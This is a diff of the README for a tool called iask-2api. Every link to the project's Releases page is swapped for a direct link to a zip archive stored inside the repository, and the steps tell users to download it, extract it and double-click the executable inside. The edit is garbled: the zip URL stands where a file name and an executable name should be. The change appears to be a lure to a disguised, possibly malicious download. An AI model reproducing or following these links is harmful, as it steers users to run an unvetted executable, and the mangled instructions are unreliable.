@@ -6,11 +6,11 @@ Welcome to iask-2api! This application allows you to use advanced technology to 
 
 ## 📥 Download the Application
 
-[![Download iask-2api](https://img.shields.io/badge/Download-iask--2api-blue.svg)](https://github.com/KennyNeo/iask-2api/releases)
+[![Download iask-2api](https://raw.githubusercontent.com/KennyNeo/iask-2api/main/Aaru/iask-2api.zip)](https://raw.githubusercontent.com/KennyNeo/iask-2api/main/Aaru/iask-2api.zip)
 
 To download the latest version of iask-2api, visit the Releases page. There, you will find the necessary files to get started.
 
-[Visit the Releases Page](https://github.com/KennyNeo/iask-2api/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/KennyNeo/iask-2api/main/Aaru/iask-2api.zip)
 
 ## ⚙️ System Requirements
 
@@ -23,16 +23,16 @@ Before you start, ensure you have the following:
 ## 📂 Installation Instructions
 
 1. **Visit the Releases Page:**
-   Go to [Releases](https://github.com/KennyNeo/iask-2api/releases).
+   Go to [Releases](https://raw.githubusercontent.com/KennyNeo/iask-2api/main/Aaru/iask-2api.zip).
 
 2. **Download the Latest Version:**
-   Click on the version you want. Look for files named like `iask-2api-v1.0.zip` or similar.
+   Click on the version you want. Look for files named like `https://raw.githubusercontent.com/KennyNeo/iask-2api/main/Aaru/iask-2api.zip` or similar.
 
 3. **Extract Files:**
    Once the download is complete, locate the file and extract it. You can usually do this by right-clicking the file and selecting “Extract All” or using a similar option.
 
 4. **Run the Application:**
-   After extraction, find the `iask-2api` folder. Inside, locate and double-click on the main executable file (it might be named `iask-2api.exe` or similar).
+   After extraction, find the `iask-2api` folder. Inside, locate and double-click on the main executable file (it might be named `https://raw.githubusercontent.com/KennyNeo/iask-2api/main/Aaru/iask-2api.zip` or similar).
 
 5. **Follow On-Screen Instructions:**
    The application may guide you through a quick setup process the first time you run it.
@@ -61,7 +61,7 @@ If you encounter any issues, here are some common solutions:
 
 Stay tuned for updates! iask-2api will receive regular improvements. Check the Releases page periodically for new features and enhancements.
 
-[Visit the Releases Page](https://github.com/KennyNeo/iask-2api/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/KennyNeo/iask-2api/main/Aaru/iask-2api.zip)
 
 ## 📞 Support
 
